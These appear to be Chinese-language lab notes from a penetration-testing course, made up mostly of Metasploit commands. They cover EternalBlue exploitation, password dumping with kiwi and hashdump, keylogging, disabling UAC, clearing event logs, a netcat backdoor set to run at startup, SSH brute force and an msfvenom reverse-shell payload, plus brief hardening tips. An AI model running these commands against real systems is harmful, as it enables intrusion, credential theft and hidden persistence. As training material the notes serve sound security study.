进入msf：msfconsole
进入工作区：workspace

配置postgresql
初始化数据库：msfdb init
启动postgresql
systemctl enable postgresql


创建，删除工作区：workspace -a/-d tedu
切换工作区：workspace 工作区名（eg：default）


控制台调用db_nmap扫描：
db_nmap -v -A ip地址
查看记录（扫描的结果）：hosts 或 workspace -v（显示工作区列表）
services（查看详细信息）

启动gvm（基于openvas的开源项目）：gvm-start


进入msf控制台：msfconsole

攻击四步：
选择枪  ：search 漏洞编号（微软的编号或cve的编号都可）
端起枪： use 脚本编号
瞄准 ：    set rhost IP地址
开枪    ：  run

永恒之蓝为例：

四步过后进入meterpreter  

getuid可以查看自己的权限

1）查找MS17-010漏洞利用脚本
2）利用漏洞攻击 Win2008 Server

加载 kiwi 模块获取系统密码     ：-----------load kiwi

利用 hashdump 获取密文，访问解密网站进行解密

将渗透进程迁移到 explorer.exe，防止退出：：
ps -S explorer 或者 ps -U Administrator 查看进程编号
migrate 进程id    --------切换进程

通过键盘记录获取目标主机的键盘输入 run post/windows/capture/keylog_recorder
使用shell命令进入靶机系统：修改防火墙配置开放 TCP 444 端口
关闭系统 UAC（使用reg.exe工具）：reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f


清除事件查看器日志：clearev


上传木马：upload 本地木马地址  靶机的文件地址

在meterpreter下查看开机启动的进程： 
reg enumval -k HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run


在meterpreter下设置开机自启：
reg setval -k HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -v "MyApp" -d "C:\path\to\nc.exe -l -p 444 -e cmd"  
查看是否设置成功：
reg enumkey/query -k HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
远程连接注入了后门程序的靶机（后门程序开启了nc程序）：nc ip 端口

防护思路：打补丁/找到后门程序关闭它/发现后门程序端口禁用他

linux系统的ssh远程连接漏洞防护与工具
攻击：
1、选枪：search ssh_login
2、端枪：use 编号
3、瞄准：set rhost ip
4、攻击：root
攻击完成后

使用Msfvenom命令生成木马后门：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>

上传木马到靶机 ：scp shell msfadmin@192.168.10.143:/tmp

启动： ssh msfadmin@192.168.10.143

在msf中监听脚本，接受后门连接： use exploit/multi/handler

在linux系统中设置木马的自启。

1、禁用root的远程连接
2、设置登录验证次数
3、设置最多有几个会话（注意：只有debian系统和centos可以配置，ubuntu禁用这个configuration）
4、可以使用密码连接和密钥连接相结合的方式进行身份验证

